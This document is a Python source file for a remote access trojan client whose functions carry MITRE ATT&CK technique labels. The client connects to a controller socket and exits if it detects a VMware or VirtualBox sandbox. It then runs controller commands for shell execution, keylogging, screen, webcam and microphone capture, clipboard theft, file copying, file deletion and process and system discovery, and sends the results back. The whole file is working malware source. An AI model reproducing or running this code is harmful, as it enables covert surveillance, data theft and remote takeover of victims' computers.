# Created by Esmira Abdullaieva

import socket
import os
import subprocess
import platform
import pyperclip
import cv2
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
import time
from pynput.keyboard import Key, Listener


client = socket.socket()
IP = socket.gethostbyname(socket.gethostname())
client.connect((IP, 9091))

if os.name == 'posix':
    system = 'unix'
else:
    system = 'windows'

client.send(f'[CONNECTED] \n[OPERATION SYSTEM] : {system}'.encode())


def vm():
    if system == "unix":
        comm = 'ps'
    else:
        comm = 'tasklist'
    process = subprocess.getoutput(comm)
    if 'vmtoolsd' in process or 'vboxservice.exe' in process or 'vboxtray.exe' in process:
        return 1
    else:
        return 0


# T1056 Input Capture
def input_cap():
    long = int(client.recv(1024).decode())
    keys = []

    def on_press(key):
        if key == Key.space:
            key = ''
        keys.append(str(key))
        if len(keys) > long:
            client.send(''.join(keys).encode())
            return False

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# T1057 Process Discovery
def proc_discovery():
    if system == "unix":
        comm = 'ps'
    else:
        comm = 'tasklist'
    output = subprocess.getoutput(comm).encode()
    client.send(output)


# T1059 Command-Line Interface
def command_line():
    comm = client.recv(1024).decode()
    output = subprocess.getoutput(comm)
    if output != '':
        client.send(output.encode())
    else:
        client.send('[DONE]'.encode())


# T1082 System Information Discovery
def system_info():
    info = str(platform.uname()).encode()
    client.send(info)


# T1083 File and Directory Discovery
def discovery():
    if system == "unix":
        comm = 'ls'
    else:
        comm = 'dir'
    path = client.recv(1024).decode()
    output = subprocess.getoutput(comm + ' ' + path).encode()
    client.send(output)


# T1105 Remote File Copy
def copy():
    path = client.recv(1024).decode()
    file = open(path, 'rb')
    data = file.read()
    client.send(data)


# T1107 File Deletion
def delete():
    path = client.recv(1024).decode()
    os.remove(path)
    client.send('[DELETED]'.encode())


# T1113 Screen Capture
def screen():
    img = ImageGrab.grab((0, 0, 500, 500))
    img.save('screen.png')
    file = open('screen.png', 'rb')
    data = file.read()
    client.send(data)
    file.close()
    os.remove('screen.png')


# T1115 Clipboard Data
def clipboard():
    clip = str(pyperclip.paste()).encode()
    client.send(clip)


# T1123 Audio Capture
def audio():
    frequency = 44100
    duration = 0.5
    recording = sd.rec(int(duration * frequency), samplerate=frequency, channels=1)
    sd.wait()
    write('record.wav', frequency, recording)
    file = open('record.wav', 'rb')
    data = file.read()
    client.send(data)
    file.close()
    os.remove('record.wav')


# T1125 Video Capture
def video():
    cap = cv2.VideoCapture(0)
    vid_cod = cv2.VideoWriter_fourcc(*'XVID')
    if not cap.isOpened():
        raise IOError("Cannot open webcam")
    record = cv2.VideoWriter('video.mov', vid_cod, 20.0, (640, 480))

    i = 0
    while True:
        ret, frame = cap.read()
        record.write(frame)
        time.sleep(0.05)
        i = i+1
        if i > 30:
            break

    cap.release()
    cv2.destroyAllWindows()

    file = open('video.mov', 'rb')
    data = file.read()
    client.send(data)
    file.close()
    os.remove('video.mov')


if vm():
    exit()
else:
    while True:
        command = client.recv(2048).decode()
        print(f'[RECEIVED] : {command}')
        if command == 'folder':
            discovery()
        if command == 'screen':
            screen()
        if command == 'system':
            system_info()
        if command == 'line':
            command_line()
        if command == 'clip':
            clipboard()
        if command == 'audio':
            audio()
        if command == 'video':
            video()
        if command == 'copy':
            copy()
        if command == 'delete':
            delete()
        if command == 'input':
            input_cap()
        if command == 'process':
            proc_discovery()
        if command == 'exit':
            out = '[DISCONNECTED]'
            client.send(out.encode())
            print(out)
            break

client.close()
